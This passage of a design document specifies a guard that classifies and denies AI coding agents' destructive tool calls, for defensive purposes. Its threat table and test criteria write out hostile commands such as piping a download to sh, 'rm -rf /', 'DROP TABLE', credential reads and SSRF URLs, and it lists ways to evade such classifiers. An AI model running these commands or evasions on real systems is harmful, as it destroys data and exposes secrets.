`sqlglot.parse(target, dialect=ACTION_SQL_DIALECT or None)` returns one expression per statement, so `SELECT 1; DROP TABLE users` is two classifications and the decision is `deny`. A `ParseError`, or an expression type the mapping does not name (`exp.Command`, sqlglot's fallback for statements it does not understand), is `sql.unparsed`. A `WHERE` is "present" when the `Update`/`Delete` expression has a `where` arg whose condition is not a constant-true expression after sqlglot's simplifier — so `WHERE 1=1` and `WHERE TRUE` are unscoped. Comment-wrapped keywords (`DR/**/OP`) do not parse as `DROP` and fall to `sql.unparsed`, which denies them anyway.

### 6.10 The audit table (D8)

```sql
CREATE TABLE IF NOT EXISTS action_decisions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT NOT NULL,
    audit_id INTEGER,                 -- audit_logs.id of the request; NULL for direct calls
    session_id TEXT,
    user_id TEXT NOT NULL,
    role TEXT NOT NULL,
    tool_call_id TEXT NOT NULL,
    tool_name TEXT NOT NULL,
    operation_kind TEXT,              -- NULL for tool.unknown / tool.malformed
    target_preview TEXT,              -- first 500 chars of the target the rule judged
    arguments_hash TEXT NOT NULL,     -- hash_prompt() over the raw arguments string
    arguments_preview TEXT,           -- first 500 chars of the raw arguments string
    decision TEXT NOT NULL,           -- allow | flag | deny
    rule TEXT NOT NULL,
    granted_by TEXT,                  -- the action permission, when one lifted the rule
    classifications TEXT NOT NULL,    -- JSON array: [{rule, kind, detail}], every one
    policy_digest TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_action_decisions_user_ts ON action_decisions(user_id, timestamp);
CREATE INDEX IF NOT EXISTS idx_action_decisions_audit ON action_decisions(audit_id);
```

Why a table and not the brief's "audit columns": one response can carry several tool calls, and `audit_logs` is one row per request. PRD-011 Section 6.7 already hit that wall ("recording all of them needs a second table") and the roadmap's *Tool-call auditing* is explicit: "one row per call". A summary column on `audit_logs` would be the second place that says the same thing; PRD-017 may add one if the Register needs it, with this table as its source.

No foreign key, for the reason `chat_messages` gives in [app/db/models.py](../../../app/db/models.py): SQLite enforces foreign keys only per connection with a pragma the shared libSQL client cannot guarantee, and a declared-but-unenforced constraint reads as a guarantee. A new table arrives by `CREATE` alone and needs no added-columns mapping.

### 6.11 Directory structure (files touched)

```
app/
├── config.py                          # + 3 settings, validators
├── main.py                            # action_config.load() after authz.load()
├── db/
│   ├── models.py                      # + CREATE action_decisions, two indexes, ActionDecisionRow
│   └── database.py                    # init_db() creates it; insert/list/count functions; snapshot counts
├── models/schemas.py                  # ActionDecisionEntry, ActionsResponse; StatsResponse + 3 counts
├── routers/admin.py                   # GET /audit/actions; /stats counts
└── services/
    ├── authz.py                       # + 6 action permissions, ACTION_PERMISSIONS, holds()
    ├── strict_yaml.py                 # NEW: safe_load with duplicate-key rejection
    ├── pattern_config.py              # adopts strict_yaml
    ├── action_config.py               # NEW: built-in policy, YAML load, validation, digest, ActionConfigError
    ├── action_adapters.py             # NEW: ToolCall, Operation, tool mapping -> operations
    ├── action_classifiers/            # NEW package
    │   ├── __init__.py                # RuleId, Classification
    │   ├── sql.py
    │   ├── shell.py
    │   ├── paths.py
    │   ├── network.py
    │   └── secrets.py
    ├── action_policy.py               # NEW: evaluate(), evaluate_all(), ActionDecision
    ├── action_audit.py                # NEW: record()
    ├── v1_translate.py                # runtime strings: (PRD-016) -> (PRD-017)
    ├── openrouter_client.py           # runtime string retargeted
    └── query_pipeline.py              # runtime string retargeted
app/models/messages.py                 # runtime string retargeted
chat_ui/chat_ui/
├── chat_ui.py                         # action_config.load() in the mounted lifespan; Actions route
├── admin_state.py / admin_models.py   # Actions view state and row model
├── admin_copy.py                      # view copy
└── components/actions.py              # NEW: the Actions view
examples/action_policy.yaml            # NEW
tests/
├── corpora/actions/
│   ├── synthetic/*.yaml               # NEW: {tool_call, expect: {role: decision}}
│   ├── evasion/*.yaml                 # NEW: {tool_call, of: <denied original>, expect: not allow}
│   └── SOURCES.md                     # NEW: adapter provenance
├── test_action_config.py              # NEW
├── test_action_adapters.py            # NEW
├── test_action_sql.py                 # NEW
├── test_action_shell.py               # NEW
├── test_action_paths.py               # NEW
├── test_action_network.py             # NEW
├── test_action_secrets.py             # NEW
├── test_action_policy.py              # NEW: severity, grants, RBAC-off
├── test_action_audit.py               # NEW
├── test_action_corpus.py              # NEW: synthetic + evasion
├── test_strict_yaml.py                # NEW
└── test_admin_actions.py              # NEW
```

### 6.12 Patterns followed

- **Wholesale replacement with startup failure** — `authz.load()` / `pattern_config.load()`; `ActionConfigError` names the file, the node and the rule; the policy is rebound as the last statement so a failing file leaves the previous one intact. The one deliberate exception is `rules:`, merged per id (Section 6.6).
- **Loaded once at startup in both lifespans** — `app/main.py` *and* `chat_ui/chat_ui/chat_ui.py`, because the Reflex `api_transformer` mount bypasses `app.main`'s lifespan (PRD-007).
- **`get_policy()` returns the built-in until `load()` runs** — `pattern_config.get_policy()`'s shape, so every test that never boots an app gets the floor.
- **Pure engine, I/O at the edges** — `action_adapters`, `action_classifiers` and `action_policy` import no settings and read no file, like `pattern_detector`; `action_config` holds all configuration I/O and `action_audit` all database I/O.
- **Closed vocabularies validated explicitly** — rule ids, operation kinds, decisions and action permissions are enumerated in error messages, the `_allowed()` style of `pattern_config`.
- **Corpora as checked-in files** — PRD-011 F8 and PRD-012: a reviewer reads them as data, an operator adds to them, and the corpus suite parametrizes over the directory.
- **New table by `CREATE` alone, no foreign key** — `usage_daily` and `chat_messages` precedent.
- **Previews and hashes** — `hash_prompt()` and the 500-character preview of `audit_logger`.

## 7. Tools/Features

### F1 — Tool mapping and adapters
`map_tool_call(tool_call, policy) -> MappingResult` returns `Operations(tuple[Operation, ...])`, `Opaque(decision)`, `Unknown()` or `Malformed(detail)`. `arguments` is parsed with `json.loads` after the length check; a non-object, a missing target key or a non-string target is `Malformed`. A tool whose target is patch text (OpenCode and Cline `apply_patch`) yields one `fs_write` per `*** Add/Update/Delete File:` and `*** Move to:` path it names; a patch with no parseable header is `Malformed`, never zero operations (STORY-001 S1). Array targets (Cline 4.x `commands[]`, `files[].path`, `requests[].url`) yield one operation per element; an optional target that is absent defaults to the working directory `.` (S8). Built-in mappings are data in `action_config`, not code, so the deployment's `tools:` replaces them cleanly.

### F2 — SQL classifier
`classify_sql(statement, dialect) -> tuple[Classification, ...]`, one per parsed statement (Section 6.9).

### F3 — Shell classifier
`classify_shell(command, policy) -> tuple[Classification, ...]`, one per segment plus embedded classifications (Section 6.8). Calls F2, F5, F6 for embedded targets.

### F4 — Path classifier
`normalize_path(path) -> NormalizedPath` and `classify_write(path, policy)` / `classify_read(path, policy)` (Section 6.5). A read of a secret glob is `secret.read`, not `fs.read`.

### F5 — Network classifier
`classify_url(url, policy) -> Classification` (Section 6.5). `http` tools and the URLs in `curl`/`wget` arguments both route here.

### F6 — Secret classifier
`classify_secret_read(target, policy)` for paths and `classify_env_reference(name, policy)` for `$NAME`, `${NAME}`, `printenv NAME`, `env` with no arguments (the whole environment: always `secret.read`).

### F7 — Decision engine
`evaluate(tool_call, identity, policy=None)`: map → classify every operation → decide each classification (`holds(identity, rule.grant)` → `allow`, else `rule.default`) → most severe wins → `ActionDecision` with every classification attached and `policy_digest` stamped. `evaluate_all` maps over a sequence preserving order. Neither raises for any input a model can produce; a classifier bug that raises is caught at the `evaluate` boundary, logged at `ERROR` with the tool name and rule (never the arguments), and returned as `deny` under `tool.malformed` — fail closed (T9).

### F8 — Action policy file
`action_config.load()`, `get_policy()`, `policy_digest()`. Validation rules in Section 9.3. The built-in policy is constructed once at import from module-level data and passed through the same validator the file goes through, so the built-in floor cannot drift into a shape a file would be refused for.

### F9 — Action permissions and `holds()`
Section 6.7. `RBAC_ROLES_FILE` granting `action:sql:write` is accepted by the existing unknown-permission check because the permission is now known.

### F10 — Decision audit
`action_audit.record(decisions, identity, audit_id=None, session_id=None) -> list[int]` writes one row per decision in one transaction. `list_action_decisions(limit, user_id=None, decision=None)`, `count_action_decisions() -> {allow, flag, deny}`.

### F11 — Admin API and console
`GET /audit/actions?decision=deny&limit=100` → `ActionsResponse(entries: list[ActionDecisionEntry])`, scoped like `GET /audit`. `/stats` gains three counts. The console's fourth view, **Actions**, follows the existing Register/Summary/Usage shell; it is a table, not a dashboard, and it shows `deny` first by default because that is the row an admin opens the view to find.

### F12 — Corpora
Section 11's corpus criteria. Each file is a YAML document `{tool_call: {name, arguments}, expect: {user: deny, dba: allow}, note: "..."}` or, under `evasion/`, `{tool_call, of: <synthetic file>, expect: not_allow}`. The suite loads the built-in policy plus a test RBAC matrix that defines `dba` with `action:sql:write`.

### F13 — Documentation
README and `docs/features.md`: *Action policy rules* as a built feature with the rule table, the file format, the permission list, the workspace/relative-path rule, the PowerShell limitation, and "not yet called by `/v1` — PRD-017". `docs/roadmap.md`: the section's "they are not built yet" replaced. `.env.example`: three settings. `examples/action_policy.yaml`.

## 8. Technology Stack

| Layer | Choice | Note |
|---|---|---|
| SQL parsing | **`sqlglot`**, pure Python, exact version pinned in `requirements.txt` by STORY-008 | New dependency (D2). No C extension, no network. Regex was rejected in the brief as trivially evaded; `sqlglot` gives statement types and `WHERE` presence as data |
| Shell tokenization | `shlex`, stdlib, `posix=True`, `punctuation_chars` | No third-party shell parser. `bashlex` was considered and rejected: unmaintained, and a full bash AST is more surface than the deny-on-uncertainty design needs |
| URL parsing | `urllib.parse` + `encodings.idna`, stdlib | `ipaddress` for literal and reserved-range checks |
| Globs | `fnmatch` / `PurePosixPath.match`, stdlib | Compiled to regex at load; `**` handled by the loader's own translation, tested |
| Config | YAML via `PyYAML` (already explicit in `requirements.txt`) through `strict_yaml` | Same reasoning as PRD-011 Section 8: a security policy needs comments |
| Config model | Frozen dataclasses | Like `pattern_config`; validated by our own loader, never parsed per request |
| Storage | libSQL / Turso | One new table, two indexes, created by `init_db()` |
| Admin UI | Reflex 0.9.6.post1, existing admin shell and theme | The fourth view reuses `admin_shell` and the Register table's components |
| Tests | `pytest` | Corpora as files under `tests/corpora/actions/` |

## 9. Security & Configuration

### 9.1 Authentication & authorization
Unchanged for the request. The engine runs for an identity already authorized for `query:submit` (Section 6.1). `GET /audit/actions` reuses `GET /audit`'s scoping: `audit:read:all` reads every user's decisions, `audit:read:own` reads only the caller's, neither → 403.

### 9.2 Threat reasoning

| # | Threat | Treatment |
|---|---|---|
| T1 | **A text-clean prompt yields a destructive tool call** — the brief's problem | The engine classifies the call itself, after the model wrote it. Not enforced in a live path until PRD-017; this PRD proves the classification |
| T2 | **Obfuscation**: quoting, escapes, base64, `eval`, `$(…)`, chaining | Quotes and escapes resolved by `shlex`; chaining split into segments, most severe wins; substitution, `eval`, `source`, process substitution → `shell.unclassifiable` (deny, no grant). The evasion corpus asserts no `allow` (D5) |
| T3 | **An unknown tool as a bypass** — a client or MCP server names its tool something unmapped | `tool.unknown`, deny, no grant (D1). Opening one is a named `opaque_tools` entry in the file |
| T4 | **The escape hatch grants everything** — `RBAC_ENABLED=false` | `holds()` never consults `RBAC_ENABLED` (D7); a test runs the grant suite with RBAC off and asserts every grantable rule falls to its default |
| T5 | **A role grant reaches a rule nobody should lift** | Ten deny rules are non-grantable: a file that adds a grant to any of `sql.unscoped_write`, `sql.dcl`, `sql.unparsed`, `shell.destructive`, `shell.pipe_to_interpreter`, `shell.unclassifiable`, `fs.write_protected`, `net.unparsed`, `tool.unknown`, `tool.malformed` is refused at startup. Their *default* can be changed — visibly, in the file — their grant cannot |
| T6 | **Path tricks**: `..`, mixed separators, `~`, case, Windows drive letters | Lexical normalization before matching (Section 6.5); protected globs match case-insensitively; a test per trick. **Symlinks are not resolved** — the harness cannot see the filesystem (Risk 4) |
| T7 | **A policy file that silently allows** — empty `tools`, a typo'd rule id, a misspelled decision | Unknown keys, unknown rule ids, unknown decisions and permissions are startup errors; `tools: {}` is refused; `rules:` merges per id so an omitted rule keeps its floor rather than vanishing |
| T8 | **SSRF via allowlist wildcards** — `*.example.com` reaching `169.254.169.254` or `localhost` | Wildcards never match loopback, link-local, metadata or private literals (Section 6.5); userinfo in a URL (`https://allowed.com@evil.com`) is `net.unparsed` |
| T9 | **A classifier bug raises** and the call slips through an exception handler upstream | `evaluate()` catches at its boundary and returns `deny` / `tool.malformed`; logged at `ERROR` with tool name and rule, never arguments |
| T10 | **Secrets in the audit** — a denied `secret.read` or `echo $AWS_SECRET_ACCESS_KEY=…` writes the secret into `arguments_preview` | Accepted and stated: the same exposure `prompt_preview` already carries for prompts, behind the same `audit:read:*` permissions. The model wrote it into a response the client would have received; the audit holding 500 characters of it is the evidence. A deployment that cannot accept that is the case for a future `ACTION_AUDIT_PREVIEW=false` (Section 13) |
| T11 | **Reason strings leak the policy** — an agent learns the allowlist from denials | `reason` is a fixed per-rule template plus the matched fragment of the *call* (`DROP`, `rm -rf`, `.env`), never a configured value (no host list, no root path) |
| T12 | **ReDoS / cost** — a huge argument string or deeply nested shell | `ACTION_MAX_ARGUMENT_CHARACTERS` bounds input before `json.loads`; recursion depth ≤ 3; globs compiled at load; no user-supplied regex in the policy file (globs only) |
| T13 | **The policy file as a vector** — a writable `ACTION_POLICY_FILE` | The trust boundary `RBAC_ROLES_FILE` and `PATTERNS_FILE` already sit on; no new mitigation claimed |

### 9.3 Configuration

| Variable | Default | Validation | Purpose |
|---|---|---|---|
| `ACTION_POLICY_FILE` | `""` | Readable YAML matching the schema, or startup error | Path to the action policy; empty uses the built-in policy and reads no file |
| `ACTION_MAX_ARGUMENT_CHARACTERS` | `100000` | `≥ 1` | Ceiling on a tool call's `arguments` string; over it is `tool.malformed` |
| `ACTION_SQL_DIALECT` | `""` | Empty, or a dialect name `sqlglot` knows — checked in `action_config.load()` | Dialect for SQL parsing; empty uses `sqlglot`'s generic dialect |

Policy-file validation (each an `ActionConfigError` naming the file and node):
unknown top-level or section key · unknown rule id under `rules:` · `default` not in `allow | flag | deny` · `grant` not in `ACTION_PERMISSIONS` · a `grant` on a non-grantable rule (T5) · `tools:` present and empty · a tool mapping with an unknown `kind` or a missing `target` · a tool name in both `tools` and `opaque_tools` · `opaque_tools` value not a decision · a relative path in `workspace.roots` · a glob that does not translate · a network entry that is neither a host, a `*.`-wildcard host nor an IP literal · a `shell.allow` entry that is empty or contains a shell operator · duplicate YAML keys anywhere.

### 9.4 Out of scope (security)
Enforcement in the live response path and the wire shape of a denial (PRD-017). Sandboxing and execution. Symlink and DNS resolution. PowerShell/cmd semantics. MCP payload inspection. Semantic intent detection. Per-user grants.

## 10. API Specification

**No change to `POST /query` or `/v1`.** `/v1` still refuses `tools` with `tools_not_supported`; only the message text changes from `(PRD-016)` to `(PRD-017)` (D14).

| Endpoint | Change |
|---|---|
| `GET /audit/actions` | **New.** `?limit=` (1–500, default 100), `?decision=allow\|flag\|deny`. Scoped like `GET /audit` |
| `GET /stats` | Adds `actions_denied`, `actions_flagged`, `actions_allowed`. Additive |
| Admin console · Actions | **New view**, fourth tab beside Register, Summary and Usage |

```json
GET /audit/actions?decision=deny&limit=1
{
  "entries": [
    {
      "id": 41,
      "timestamp": "2026-11-20T14:02:11Z",
      "audit_id": null,
      "user_id": "dev-1",
      "role": "user",
      "tool_call_id": "call_9",
      "tool_name": "query",
      "operation_kind": "sql",
      "target_preview": "DROP TABLE users",
      "decision": "deny",
      "rule": "sql.ddl",
      "reason": "destructive SQL is not permitted: DROP",
      "granted_by": null,
      "classifications": [{"rule": "sql.ddl", "kind": "sql", "detail": "DROP"}],
      "policy_digest": "sha256:3f1c…"
    }
  ]
}
```

`arguments_preview` and `arguments_hash` are **not** on the API entry — the target is what the rule judged and is what an admin reads; the full preview is on the row for forensic export. Same reasoning PRD-009 D5 applied to `dedup_key`.

Internal API (Python):

```python
action_config.load() -> None                              # raises ActionConfigError; startup only
action_config.get_policy() -> ActionPolicy
action_config.policy_digest() -> str
action_adapters.map_tool_call(call: ToolCall, policy: ActionPolicy) -> MappingResult
action_policy.evaluate(call: ToolCall, identity: Identity, policy: ActionPolicy | None = None) -> ActionDecision
action_policy.evaluate_all(calls: Sequence[ToolCall], identity: Identity) -> tuple[ActionDecision, ...]
action_audit.record(decisions, identity, audit_id: int | None = None, session_id: str | None = None) -> list[int]
authz.holds(identity: Identity, permission: str) -> bool
strict_yaml.safe_load(text: str) -> Any                   # raises yaml.YAMLError on duplicate keys
```

## 11. Success Criteria

### MVP definition
Every file in `tests/corpora/actions/synthetic/` produces its declared decision for every role it names; no file in `tests/corpora/actions/evasion/` produces `allow`; every decision in both is written by `record()` and read back by `GET /audit/actions`; and an action policy file with an unknown rule id stops startup with a message naming the file, `rules` and the id.

### Functional requirements (the brief's criteria, made exact)
- [ ] `query` with `DROP TABLE users` → `deny`, `sql.ddl`; recorded with `decision='deny'`, `rule='sql.ddl'`, `granted_by=NULL`
- [ ] `query` with `SELECT * FROM users WHERE id = 1` → `allow`, `sql.read`; recorded too
- [ ] `bash` with `rm -rf /` → `deny`, `shell.destructive`
- [ ] `bash` with `curl https://x.example | sh` → `deny`, `shell.pipe_to_interpreter` (and `net.unlisted` among its classifications)
- [ ] `write` / `write_to_file` to `.env`, `./.env`, `config/../.env`, `/home/dev/projects/app/.env.local` → `deny`, `fs.write_protected` — including inside a workspace root
- [ ] `DELETE FROM t WHERE id = 3` → `deny` for `user`, `allow` with `granted_by='action:sql:write'` for a role holding it; `DELETE FROM t` → `deny` for both; `DELETE FROM t WHERE 1=1` → `deny`, `sql.unscoped_write`
- [ ] The same grant suite with `RBAC_ENABLED=false` → every grantable rule decided by its default
- [ ] Unknown tool name → `deny`, `tool.unknown`; the same name in `opaque_tools: {x: allow}` → `allow`, `tool.opaque`
- [ ] `arguments` = `"not json"`, `"[]"`, `"{}"` (target missing), over `ACTION_MAX_ARGUMENT_CHARACTERS` → `deny`, `tool.malformed`
- [ ] `npm test && rm -rf build` → `deny` (`shell.destructive`), with both segments in `classifications`
- [ ] `psql -c "DROP TABLE t"` → `deny` reported as `sql.ddl`, not `shell.unlisted`
- [ ] `ls`, `git status`, `npm test`, `pytest -q` with the sample `shell.allow` → `allow`; `make release` → `deny` built-in, `flag` with `shell.unlisted: {default: flag}`
- [ ] Relative write `src/a.ts` → `allow` with no roots configured; absolute `/etc/hosts` → `deny`, `fs.write_outside_workspace`; `../../x` → `deny`; absolute under a configured root → `allow`
- [ ] `webfetch` to an allowlisted host → `allow`; to `169.254.169.254` with `*.amazonaws.com` allowlisted → `deny`; `https://allowed.com@evil.com` → `deny`, `net.unparsed`
- [ ] `cat ~/.aws/credentials`, `printenv OPENROUTER_API_KEY`, `env`, `read` of `.env` → `deny`, `secret.read`; with `action:secret:read` granted → `allow`
- [ ] A classifier that raises → `deny`, `tool.malformed`, `ERROR` log line without the arguments
- [ ] `reason` never contains a configured host, root or allowlist entry (asserted over the whole synthetic corpus)
- [ ] Every `ActionDecision` carries the `policy_digest` of the policy in force; changing one rule changes the digest
- [ ] `RBAC_ROLES_FILE` granting `action:sql:write` loads; granting `action:sql:writ` fails with `AuthzConfigError`
- [ ] `GET /audit/actions` returns all users' rows for `audit:read:all`, only the caller's for `audit:read:own`, 403 otherwise; `?decision=` filters
- [ ] `/stats` reports the three counts; `init_db()` on a pre-PRD database creates the table and both indexes and touches no existing table

### Configuration criteria (the brief's "invalid rule file stops startup")
- [ ] Each validation rule in Section 9.3 has a test that loads a file breaking it and asserts `ActionConfigError` naming the file and the node
- [ ] Empty `ACTION_POLICY_FILE` reads no file (asserted with a path that would fail if opened)
- [ ] A failing file leaves the previously loaded policy in force
- [ ] `examples/action_policy.yaml` loads in a test
- [ ] A `PATTERNS_FILE` with a duplicate key now fails startup; every other `tests/test_pattern_config.py` assertion is unchanged

### Corpus criteria
- [ ] `synthetic/` — at least 40 calls: every rule in Section 6.3 produced at least once; at least 15 ordinary agent operations across OpenCode and Cline tool names that must be `allow`; the brief's five criteria verbatim
- [ ] `evasion/` — at least 30 variants of denied calls across: quoting and escapes (`r''m`, `"rm"`, `\rm`), flag permutations (`-fr`, `-r -f`, `--recursive --force`), wrappers (`sudo`, `env X=1`, `nohup`, `xargs`, `/usr/bin/rm`), chaining (`;`, `&&`, `||`, `&`, newline), substitution (`$(…)`, backticks, `<(…)`), `eval`/`source`, base64-to-interpreter, nested `bash -c`, SQL comments and casing (`dRoP`, `DR/**/OP`, `;`-stacked statements), path tricks (`..`, `\`, `C:/`, case, trailing `/`), URL tricks (userinfo, IP-in-decimal, IDNA lookalike). **None** produces `allow`
- [ ] Every built-in adapter mapping has a provenance line in `SOURCES.md` (client, version or commit, tool schema location)

### Quality indicators
- [ ] Full suite green; no existing assertion changed except the six retargeted runtime strings and the strict-YAML behaviour, each with a comment citing PRD-016 and the decision
- [ ] `action_policy`, `action_adapters` and `action_classifiers` import no `settings` and do no I/O (asserted by an import-graph test, as for `pattern_detector`)
- [ ] `evaluate()` p95 over the synthetic corpus measured and recorded in the corpus story's report
- [ ] The Actions view renders with zero rows, with 500 rows, and at phone width

## 12. Implementation Phases

### Phase 1 — Model the threat and the vocabulary (Stories 1–4)
**Goal:** what is being defended, what agents actually send, and the names everything else uses.
**Deliverables:** threat model and adapter survey (OpenCode, Cline, and the decision that Aider has no tool-call surface to adapt — or the mapping if it does); `(PRD-016)` runtime strings retargeted; `RuleId`, operation kinds, the six action permissions and `holds()`; `ToolCall`/`Operation` and the adapter layer with built-in mappings.
**Validation:** `SOURCES.md` exists; `RBAC_ROLES_FILE` accepts action permissions; RBAC-off test for `holds()`.

### Phase 2 — Configuration (Stories 5–7)
**Goal:** the policy is a file, validated at startup, with a built-in floor.
**Deliverables:** three settings; `strict_yaml` and its adoption by `pattern_config`; `action_config` with built-in policy, per-id rule merge, wholesale sections, validation, digest; `load()` in both lifespans; `examples/action_policy.yaml`.
**Validation:** every Section 9.3 rule has a failing-file test; the built-in passes its own validator.

### Phase 3 — Classifiers and the engine (Stories 8–14)
**Goal:** every operation kind classified, every call decided.
**Deliverables:** SQL, shell, path, network and secret classifiers; the decision engine with grants, severity and the fail-closed boundary.
**Validation:** per-classifier unit suites; the brief's five criteria pass as unit tests.

### Phase 4 — Evidence (Stories 15–20)
**Goal:** decisions are recorded, readable and proven against corpora.
**Deliverables:** `action_decisions` table and `record()`; `GET /audit/actions` and `/stats` counts; the Actions view; synthetic and evasion corpora; README, `docs/features.md`, `docs/roadmap.md`, `.env.example`; pre-PRD marked promoted.
**Validation:** corpus suite green; no evasion `allow`; latency recorded; full suite green.

## 13. Future Considerations

- **PRD-017 (tool calling)**: the first caller. Decides the wire shape of a denial (D4), the mixed-response rule (brief D1), and whether `audit_logs` gains a summary column fed by this table.
- **Promote `flag` classes to `deny`** from Actions-view data, the same path PRD-011 D4 set out for `tool: flag`.
- **`ACTION_AUDIT_PREVIEW=false`** for deployments that cannot keep 500 characters of a denied secret read (T10).
- **PowerShell classification** once a Windows-hosted agent is in the E2E matrix — today it is `shell.unclassifiable`.
- **MCP payload adapters** (`use_mcp_tool` → the inner tool's mapping), with MCP hosting on the roadmap.
- **Per-user grants**, once a deployment needs one person — not a role — to hold `action:sql:ddl`.
- **Hot reload** of `ACTION_POLICY_FILE` on a signal.
- **A shared corpus** across PRD-011, PRD-012 and this PRD: the agent-prompt corpus and the action corpus describe the same sessions from two sides.

## 14. Risks & Mitigations

| # | Risk | Likelihood / Impact | Mitigation |
|---|---|---|---|
| 1 | **Classifiers are evadable** — a shell or SQL construct nobody thought of produces `allow` | Medium / High | Deny on uncertainty: anything the tokenizer or parser cannot fully read is a no-grant deny (D5). The evasion corpus is checked in and grows with every finding; an `allow` in it is a red build |
| 2 | **Over-blocking makes agents unusable** — `shell.unlisted: deny` stops `make`, `cargo build`, `go test` | High / Medium | `flag` per rule for rollout; the sample file ships a realistic `shell.allow`; the Actions view shows what fires; relative in-repository writes allowed with no configuration (Section 6.5) |
| 3 | **Windows agents** — Cline's `run_commands` runs the user's shell and OpenCode's `bash` can run `pwsh`, `powershell` or `cmd`; PowerShell often tokenizes cleanly under POSIX `shlex` | Medium / Medium | Misreads the tokenizer rejects are `shell.unclassifiable`. Clean-tokenizing PowerShell/cmd would otherwise fall to the grantable `shell.unlisted`, so the common destructive heads (`Remove-Item` with `-Recurse`, `rd`/`rmdir /s`, `del /s`, `Format-Volume`) are `shell.destructive`, `pwsh`/`powershell -Command` and `cmd /c` are inline interpreters, and `Invoke-Expression`/`iex` is unclassifiable (D16, STORY-001 S3). A full PowerShell classifier stays a Future Consideration |
| 4 | **Symlinks** — `ln -s /etc x` then write `x/hosts` passes the workspace check | Medium / Medium | `ln` is not on the sample `shell.allow`, so the first step is `shell.unlisted` (deny by default). The harness cannot resolve links on a client's disk; stated in the README rather than claimed |
| 5 | **Adapters drift** — OpenCode or Cline renames a tool or an argument | Medium / Medium | A renamed tool is `tool.unknown` (deny), not a bypass; a renamed argument is `tool.malformed` (deny). Provenance in `SOURCES.md` makes the drift diagnosable; the deployment's `tools:` fixes it without a release |
| 6 | **`sqlglot` mis-parses** a statement into a safer type | Low / High | Mapping is from expression class to rule with `exp.Command` and anything unnamed → `sql.unparsed`; the evasion corpus includes dialect and comment tricks; version pinned |
| 7 | **The `rules:` merge surprises an operator** who expects wholesale replacement like every other section | Medium / Low | Documented in the file's own comments and the README with the reason; the digest and the Actions view show the effective rule for each decision |
| 8 | **Strict YAML breaks an existing `PATTERNS_FILE`** with a duplicate key | Low / Low | The boot fails with the key named, which is the bug the duplicate was hiding; called out in the README's upgrade note |

## 15. Appendix

### Source
- Pre-PRD brief: [pre-prds/PRE-PRD-015-action-policy-rules.md](../../../pre-prds/PRE-PRD-015-action-policy-rules.md)
- Track overview: [pre-prds/README.md](../../../pre-prds/README.md). Depends on PRD-011 (done); blocks PRD-017 (tool calling, brief PRE-PRD-016).

### Decisions (resolved from the brief's open decisions)

| # | Question | Decision |
|---|---|---|
| D1 | Unknown tool name | **Deny** (`tool.unknown`, no grant). Per-deployment opening is `opaque_tools`, which allows *without classification* and records it as `tool.opaque`. As proposed |
| D2 | SQL: regex or parser? | **Parser, `sqlglot`**, every statement in the target; unparseable or unmapped → `sql.unparsed` (deny). As proposed |
| D3 | Shell classification | **`shlex` tokenization, segment split, normalized flag sets, pipe-to-interpreter detection, embedded SQL/URL/secret routing.** As proposed, with the refinement that inline interpreters (`bash -c`) are recursed into to depth 3 |
| D4 | Response on deny | **Deferred to PRD-017**, as the brief says. This PRD returns `decision` + `reason`, with `reason` safe to show the agent (T11) |
| D5 | Obfuscation | **Deny when not classifiable with confidence**, defined concretely as the `shell.unclassifiable`, `sql.unparsed`, `net.unparsed` and `tool.malformed` triggers in Section 6.3 — none grantable. As proposed |
| D6 | *(new)* Where per-role relaxation lives | **RBAC permissions** — six `action:*` permissions in `authz`'s closed vocabulary, granted in `RBAC_ROLES_FILE`; the policy file names the permission, never a role. No built-in role holds one (Section 6.7) |
| D7 | *(new)* `RBAC_ENABLED=false` | **No grants.** The engine uses `holds()`, which reads the matrix without the escape hatch (Section 6.7, T4) |
| D8 | *(new)* "Audit columns" | **A table**, `action_decisions`, one row per tool call, linked by nullable `audit_id`. Deviation from the brief's wording, for the reason in Section 6.10 |
| D9 | *(new)* Several classifications in one call | **Most severe wins**, deterministic first-at-severity reporting, every classification kept (Section 6.4) |
| D10 | *(new)* `flag` semantics | **Allowed and recorded as `flag`.** It is the rollout mode the brief's Risk 3 asks for; it never blocks |
| D11 | *(new)* Relative paths | **Inside the workspace unless they escape** (Section 6.5). Absolute paths need a configured root |
| D12 | *(new)* Replacement semantics | **Sections wholesale, `rules:` merged per id** (Section 6.6) |
| D13 | *(new)* Duplicate YAML keys | **Rejected**, by a shared `strict_yaml` loader that `pattern_config` adopts too |
| D14 | *(new)* Runtime strings saying `(PRD-016)` for tool calling | **Retargeted to `(PRD-017)`** in the six runtime strings and their tests; comments read through the numbering note |
| D15 | *(new, STORY-001 S9)* Directory-scoped search (`grep`, `search_codebase`, `search_files`) can return the contents of a secret file under the searched directory | **Stated limitation.** A search whose path or include/glob pattern itself matches a secret glob is `secret.read`; a search over a directory is `fs.read`. Denying every directory search would make agents unusable; the README tells deployments to keep secrets outside the workspace. Revisit with Actions-view data |
| D16 | *(new, STORY-001 S3)* PowerShell and cmd text in a shell call | **Common destructive heads are `shell.destructive`** (non-grantable), PowerShell/cmd inline execution is `shell.inline_interpreter`, `Invoke-Expression`/`iex` is `shell.unclassifiable`, so a role holding `action:shell:exec` is still denied them (Risk 3) |

### Assumptions to verify in STORY-001
- OpenCode's and Cline's current tool names and argument keys are those listed in Section 4; STORY-001 records the exact schema source for each and corrects the built-in mapping before STORY-004 ships it.
  **Corrected (STORY-001).** OpenCode v1.19.5: `patch` → `apply_patch` (`patchText`), `list` removed, `lsp` added. Cline 4.x (v4.1.26) renamed every tool. The Section 4 names are 3.x names, kept as candidates. Cline 4.x targets are arrays or patch text, and Cline 4.x asks for absolute paths. The SQL names carry `sql`/`query` and arrive prefixed through MCP. Section 4 is updated. Details and pinned sources: [`tests/corpora/actions/SOURCES.md`](../../../tests/corpora/actions/SOURCES.md). Threat mapping: [`threat-model.md`](../../spikes/PRD-016-action-policy-rules/threat-model.md).
- **Aider** does not emit OpenAI `tool_calls` in its edit formats (it edits through text blocks), so it needs no adapter. If STORY-001 finds a mode that does, its mapping is added to STORY-004.
  **Verified (STORY-001)** at v0.86.0 and `main` @ `5dc9490`. `send_completion` sends `tools` only when `functions` is not `None`, and the only coders that set it (the `*_func_coder.py` files) are absent from `coders.__all__`, which is how `--edit-format` picks a coder. Two of them also raise `RuntimeError` in `__init__`. See *Aider* in `SOURCES.md`.
- `sqlglot` returns `exp.Command` for statements it does not model, and exposes `where` on `Update`/`Delete`; STORY-008 pins the version this is verified on.

### Evidence (verified against `main` @ `1ab739e`)
